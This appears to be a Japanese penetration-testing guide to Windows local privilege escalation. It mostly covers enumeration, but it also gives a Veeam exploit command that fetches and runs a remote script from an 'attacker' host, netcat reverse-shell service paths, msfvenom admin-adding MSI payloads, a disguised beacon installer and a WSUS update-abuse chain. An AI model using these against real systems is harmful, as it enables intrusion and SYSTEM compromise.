# Windowsローカル権限昇格

{{#include ../../banners/hacktricks-training.md}}

### **Windowsローカル権限昇格ベクトルを探すための最適なtool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

このページでは、複数の基本的なguideに基づく、Windows権限昇格の一般的なmethodologyをまとめています。<sup>[[1]](#references)[[3]](#references)[[6]](#references)[[7]](#references)[[8]](#references)[[11]](#references)</sup> 実践的なenumerationの流れは、community workshopとchecklistも参考にしています。<sup>[[4]](#references)[[9]](#references)[[10]](#references)</sup> 過去のattackに関する内容には、Windows権限昇格についてのDerbyCon presentationも含まれています。<sup>[[5]](#references)</sup>

## Windowsの基礎理論

### Access Tokens

**Windowsのaccess tokenについて知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEsについて詳しくは、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windowsのintegrity levelについて知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## WindowsのSecurity Controls

Windowsには、**systemのenumerationを妨げたり**、executableを実行したり、さらには**あなたの活動を検知したり**するさまざまな要素があります。権限昇格のenumerationを開始する前に、以下の**page**を**読んで**、これらすべての**defense** **mechanism**を**enumerate**する必要があります:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

物理アクセスがあれば、offline UEFI NVRAM editを、pre-boot DMAとWindows `SYSTEM`のmemory-patching chainに変えることもできます:

{{#ref}}
../../hardware-physical-access/firmware-analysis/uefi-ifr-nvram-security-setting-patching.md
{{#endref}}

### Admin Protection / UIAccessのサイレント昇格

`RAiLaunchAdminProcess`を通じて起動されたUIAccess processは、AppInfoのsecure-path checkをbypassすると、promptなしでHigh ILに到達するために悪用できます。専用のUIAccess/Admin Protection bypass workflowはこちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagationは、任意のSYSTEM registry write（RegPwn）に悪用できます:<sup>[[18]](#references)</sup>

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近のWindows buildでは、privilegedなlocal NTLM authenticationが再利用されたSMB TCP connectionを介してreflectされる、**SMB arbitrary-port** LPE pathも導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version infoのenumeration

Windows versionに既知のvulnerabilityがないか確認してください（適用済みのpatchも確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この[サイト](https://msrc.microsoft.com/update-guide/vulnerability)は、Microsoftのsecurity vulnerabilitiesに関する詳細情報を検索するのに便利です。このdatabaseには4,700件を超えるsecurity vulnerabilitiesが登録されており、Windows環境が示す**巨大なattack surface**が分かります。

**On the system**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeasにはwatsonが組み込まれています)_

**Locally with system information**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**ExploitのGithub repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### Environment

環境変数にcredentialやJuicyな情報が保存されていませんか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で、これを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline の実行詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、およびスクリプトの一部が含まれます。ただし、完全な実行詳細や出力結果が取得されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowerShell ログの最後の15件のイベントを表示するには、次を実行します：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

スクリプトの実行に関する完全なアクティビティと全コンテンツの記録が取得され、実行時にコードのすべてのブロックが文書化されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、forensicsやmalicious behaviorの分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細なinsightsが提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block の logging events は、Windows Event Viewer の次の path にあります：**Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の20件の events を表示するには、次を使用できます：
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新のリクエストに http**S** ではなく http が使用されている場合、システムを compromise できます。

まず、cmd で以下を実行して、ネットワークが non-SSL WSUS update を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell では以下のようにします:
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合:
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
そして、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUS エントリは無視されます。

この脆弱性を exploit するには、[Wsuxploit](https://github.com/pimps/wsuxploit)、[pyWSUS ](https://github.com/GoSecure/pywsus) などのツールを使用できます。これらは、non-SSL WSUS トラフィックに `'fake'` updates を inject する、MiTM weaponized exploit scripts です。

研究の詳細はこちらをご覧ください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なレポートはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/).<sup>[[33]](#references)</sup>\
基本的に、この bug が exploit する flaw は次のとおりです。

> ローカル user proxy を変更でき、Windows Updates が Internet Explorer の settings で設定された proxy を使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus) をローカルで実行して自身のトラフィックを intercept し、asset 上で elevated user として code を実行できます。
>
> さらに、WSUS service は current user の settings を使用するため、その certificate store も使用します。WSUS hostname 用の self-signed certificate を生成し、この certificate を current user の certificate store に追加すれば、HTTP と HTTPS の両方の WSUS traffic を intercept できるようになります。WSUS は、certificate に対する trust-on-first-use 型の validation を実装するために、HSTS に類似した mechanism を使用していません。提示された certificate が user によって trusted で、正しい hostname を持っていれば、service によって受け入れられます。

この vulnerability は、[**WSUSpicious**](https://github.com/GoSecure/wsuspicious) tool を使用して exploit できます（once it's liberated）。

### SUSDB custom-update abuse: `.txt`/`.esd` 経由の unsigned payloads

これは HTTP WSUS connection の intercept とは異なる trust-boundary failure です。前提条件は、custom update を publish および approve するために、**WSUS database (`SUSDB`) の stored procedures** に十分な access があることです。実用的な entry path の 1 つは、upstream WSUS computer account を `SUSDB` をホストする別の MSSQL server に relay することです。正確な前提条件は deployment に依存するため、SQL administrator rights があると仮定せず、まず `EXECUTE` permissions を enumerate してください。<sup>[[38]](#references)[[39]](#references)</sup>

WSUS client authentication を HTTP/8530 から LDAP、SMB、または AD CS に relay する別の attack path については、[Abusing WSUS HTTP for NTLM relay](../../generic-methodologies-and-resources/pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#abusing-wsus-http-8530-for-ntlm-relay-to-ldapsmbad-cs-esc8) を参照してください。

#### update の build、target 設定、approve

custom-update workflow は、legitimate な WSUS procedures を restricted publishing API として使用します。重要な state transitions は次のとおりです。<sup>[[38]](#references)</sup>

| Stage | Relevant stored procedures |
| --- | --- |
| update metadata の import | `spImportUpdate` |
| prerequisite、localized、extended XML fragments の保存 | `spSaveXMLFragment` |
| content digest と attacker-controlled URL の関連付け | `spSetBatchURL` |
| computer group の enumerate/create と client の追加 | `spGetAllTargetGroups`, `spCreateTargetGroup`, `spGetComputerTargetByName`, `spAddComputerToTargetGroup` |
| その group に対する installation の approve | `spDeployUpdate` with `@actionID = 0` and `@isAssigned = 1` |

file name、digests、size、`CommandLineInstallation` handler は、import された metadata/fragments 全体で一致していなければなりません。content URL と target group を割り当てた後の最終 approval は、次のようになります。example GUIDs を replay するのではなく、新しい update、group、deployment identifiers を使用してください。<sup>[[38]](#references)[[39]](#references)</sup>
```sql
EXEC spDeployUpdate
@updateID = '<update-guid>', @revisionNumber = 1,
@actionID = 0, @targetGroupID = '<group-guid>',
@isAssigned = 1, @deadline = '<yyyy-mm-dd hh:mm:ss>',
@adminName = 'Administrator';
```
#### 拡張子による署名チェックのバイパス

WSUS は通常、任意の未署名実行可能コンテンツを拒否します。しかし `C:\Program Files\Update Services\Services\Microsoft.UpdateServices.ContentSyncAgent.dll` では、.NET の `VerifyFile` パスが、指定されたファイル名が `.txt` または `.esd` で終わる場合に証明書チェックフラグを false に設定します。その結果、バイト列がテキストまたは正規の ESD イメージであることを事前に確認せずに `CheckCertificateSignature` がスキップされます。したがって、たとえば `payload.exe.txt` という名前の変更されていない PE はコンテンツ検証を通過し、その後 update のコマンドラインインストールハンドラーによって起動される可能性があります。これは署名偽造ではなく、ポリシーと型の混同によるバグです。<sup>[[39]](#references)</sup>
```csharp
bool checkSignature = true;
if (fileName.EndsWith(".txt") || fileName.EndsWith(".esd"))
checkSignature = false;
if (checkSignature)
CheckCertificateSignature(/* downloaded file */);
```
#### BITS対応のステージングと自動化

`spDeployUpdate` を呼び出すと、WSUSは登録されたコンテンツを取得します。originはBITSのHTTP要件を満たす必要があります。到達可能なURLだけでは不十分です。転送では、初回の`HEAD`/`GET`フローとbyte-rangeリクエストが使用されるためです。Rangeをサポートしないサーバーでは、WSUSの同期時に、BITSがRangeプロトコルヘッダーを必要としていることを示す`EventId=364`が生成されます。<sup>[[39]](#references)</sup>

研究用PoCの[NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)は、import/fragment/URL/group/deploymentチェーンに必要なSQLを生成し、それを実行するための改変済みMSSQL clientを含み、コンテンツのステージング用に`BitsWebServer.py`も提供します。認可済みの最小構成のlabでの実行例は次のとおりです。<sup>[[40]](#references)</sup>
```bash
python3 NotWSUSpicious.py \
--wsusHostname wsus.lab.local \
--updateFileURL 'http://payload.lab.local:8443/payload.exe.txt' \
--updateName SecurityUpdate \
--updateFilePath /payloads/payload.exe.txt \
--updateArguments '' \
--computerGroup TestGroup \
--targetComputer workstation.lab.local
python3 BitsWebServer.py
```
#### 無人実行と retry persistence

Client-side interaction は policy に依存します。`Computer Configuration > Administrative Templates > Windows Components > Windows Update > Configure Automatic Updates` の `4 - Auto download and schedule install` option により、approved update は user が手動で選択しなくても、configured schedule に従って download および install されます。Testing では、update が failed/incomplete のまま残った payload は callback process の終了直後に再度提示されたため、retry behavior が recurring execution persistence になる可能性があります。ただし、client に update-failed state が表示されるため、noisy です。<sup>[[39]](#references)</sup>

#### Detection と hardening の pivot

この chain から利用できる server-side および client-side の pivot は次のとおりです。<sup>[[39]](#references)</sup>

- `SUSDB` における `spCreateTargetGroup`、`spSetBatchURL`、`spDeployUpdate` の実行を audit し、新しい targeting group、external content origin、`.txt`/`.esd` update payload、および想定外の principal（特に non-computer account）によって実行された deployment を調査する。
- `C:\Program Files\Update Services\LogFiles` で `ContentSyncAgent`、`FileVerified`、スペルミスのある `FileVerficationFailed`、`EventId=364` を確認し、suffix を無条件に信頼せず、payload extension および content magic と verification を相関させる。
- Windows Update の installation が繰り返し失敗・retry している状態、および `.txt` または `.esd` の名前を持つ content からの PE execution や想定外の child/network activity を hunt する。
- サポートされている場合は database service で Extended Protection for Authentication を必須にし、database への network access を WSUS server と authorized administrative system に制限する。custom-update procedure に対する `EXECUTE` rights を最小化し、audit する。

## Third-Party Auto-Updaters と Agent IPC (local privesc)

多くの enterprise agent は localhost IPC surface と privileged update channel を公開しています。enrollment を attacker server に強制でき、updater が rogue root CA または弱い signer check を信頼する場合、local user は malicious MSI を配信し、SYSTEM service に install させることができます。Netskope stAgentSvc chain（CVE-2025-0309）を基にした generalized technique は、こちらを参照してください:


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401 経由の SYSTEM)

Veeam B&R < `11.0.1.1261` は、**TCP/9401** で localhost service を公開しており、attacker-controlled message を処理することで、**NT AUTHORITY\SYSTEM** として arbitrary command を実行できます。<sup>[[12]](#references)</sup>

- **Recon**: listener と version を確認する。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: `VeeamHax.exe` などの PoC を必要な Veeam DLL と同じ directory に配置し、local socket 経由で SYSTEM payload を trigger する:
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下の Windows **domain** 環境には、**local privilege escalation** の脆弱性が存在します。これらの条件には、**LDAP signing が強制されていない**環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を構成できる self-rights を持っていること、そしてユーザーが domain 内にコンピューターを作成できることが含まれます。重要なのは、これらの**要件**が**デフォルト設定**で満たされることです。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit** を確認してください。

攻撃の流れの詳細については、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/)<sup>[[36]](#references)</sup> を確認してください。

## AlwaysInstallElevated

**これら 2 つのレジストリが**有効（値が **0x1**）な**場合**、任意の権限を持つユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac won't be prompted
```
meterpreter session がある場合は、**`exploit/windows/local/always_install_elevated`** モジュールを使用してこの technique を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` command を使用すると、privileges を escalate するための Windows MSI binary を current directory 内に作成できます。この script は、user/group の追加を促す precompiled MSI installer を書き出します（そのため、GIU access が必要です）。
```
Write-UserAddMSI
```
作成したバイナリを実行するだけで privileges を escalate できます。

### MSI Wrapper

この tools を使用して MSI wrapper を作成する方法については、この tutorial を読んでください。**command lines** の**実行**だけが目的の場合は、"**.bat**" ファイルを wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で **new Windows EXE TCP payload** を **`C:\privesc\beacon.exe`** に **Generate** します。
- **Visual Studio** を開き、**Create a new project** を選択して検索ボックスに "installer" と入力します。**Setup Wizard** project を選択し、**Next** をクリックします。
- **AlwaysPrivesc** などの project name を指定し、場所に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- step 3 of 4（include する files の選択）に到達するまで **Next** をクリックし続けます。**Add** をクリックし、先ほど Generate した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** project を選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、installed app をより legitimate に見せるために変更できる other properties もあります。
- project を右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** を double-click し、**beacon.exe** file を選択して **OK** をクリックします。これにより、installer の実行直後に Beacon payload が execute されます。
- **Custom Action Properties** で、**Run64Bit** を **True** に変更します。
- 最後に、**build** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform を x64 に設定したことを確認してください。

### MSI Installation

malicious な `.msi` file の **installation** を **background** で execute するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## アンチウイルスと検出器

### 監査設定

これらの設定によって何が**ログに記録される**かが決まるため、注意を払う必要があります
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingでは、ログの送信先を確認することが重要です。
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的としており、ドメインに参加しているコンピューターごとにパスワードが**一意で、ランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACL を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、認証されたユーザーはローカル管理者パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードが LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページの WDigest に関する詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによる**メモリの読み取り**やコードの注入の試みを**ブロック**して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks などの脅威からデバイスに保存された credentials を保護することです。[**Credential Guard の詳細はこちらです。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### キャッシュされた認証情報

**ドメイン認証情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録済みのセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン認証情報が確立されます。\
[**キャッシュされた認証情報についての詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

自分が所属しているグループに、興味深い権限があるか確認してください。
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**一部の特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格する方法については、以下を参照してください。


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について詳しく学習できます：[**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
以下のページで、**興味深いtoken**と、それらを悪用する方法について学習してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログインユーザー / セッション
```bash
qwinsta
klist sessions
```
### ホームフォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示する際は、**プロセスのコマンドライン内にパスワードがないか確認します**。\
**実行中のバイナリを上書きできるか**、または、[**DLL Hijacking attacks**](dll-hijacking/index.html)を悪用するために、バイナリのフォルダーへの書き込み権限があるかを確認します。
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に、実行中の[**electron/cef/chromium debuggers**](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)がないか確認してください。これを悪用してprivilegesをescalateできる可能性があります。

**プロセスのバイナリの権限を確認する**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリがあるフォルダの権限を確認する（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリからのパスワード取得

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは、**認証情報がメモリ内に平文で保存されている**ため、メモリをダンプして認証情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM として実行されている Applications では、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: "Windows Help and Support" (Windows + F1) で "command prompt" を検索し、"Click to open Command Prompt" をクリックします。

## Services

Service Triggers により、特定の条件（named pipe/RPC endpoint activity、ETW events、IP availability、device arrival、GPO refresh など）が発生した際に Windows が service を起動できます。SERVICE_START rights がなくても、trigger を発火させることで privileged services を起動できる場合があります。enumeration と activation techniques については、こちらを参照してください:

-
{{#ref}}
service-triggers.md
{{#endref}}

Services の一覧を取得します:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使用してサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ の **accesschk** バイナリを用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」が任意のサービスを変更できるか確認することを推奨します。
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe はここからダウンロードできます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### サービスを有効化する

（例：SSDPSRV で）次のエラーが発生した場合：

_システム エラー 1058 が発生しました。_\
_サービスを開始できません。無効になっているか、有効なデバイスが関連付けられていないことが原因です。_

次のコマンドで有効化できます。
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**XP SP1では、サービス upnphost が動作するには SSDPSRV に依存することに注意してください**

この問題に対する**別の回避策**は、次を実行することです：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリのパスを変更**

"Authenticated users" グループがサービスに対する **SERVICE_ALL_ACCESS** を持っているシナリオでは、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、以下のさまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: service binary の再構成を可能にします。
- **WRITE_DAC**: 権限の再構成を可能にし、service configurations を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を可能にします。
- **GENERIC_WRITE**: service configurations を変更する権限を継承します。
- **GENERIC_ALL**: 同様に service configurations を変更する権限を継承します。

この vulnerability の検出と exploitation には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries の弱い権限

service が **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または privileged domain account として実行されている一方で、**low-privileged users が service EXE またはその親フォルダーを変更できる場合**、多くの場合、**binary を置き換えて service を再起動することで service を hijack できます**。

**service が実行する binary を変更できるか**、または binary が配置されている**フォルダーへの write permissions があるか**を確認します（[**DLL Hijacking**](dll-hijacking/index.html)**。**\
**wmic**（system32 にはありません）を使用して service が実行するすべての binary を取得し、**icacls** で権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
次のように **sc** と **icacls** も使用できます:
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
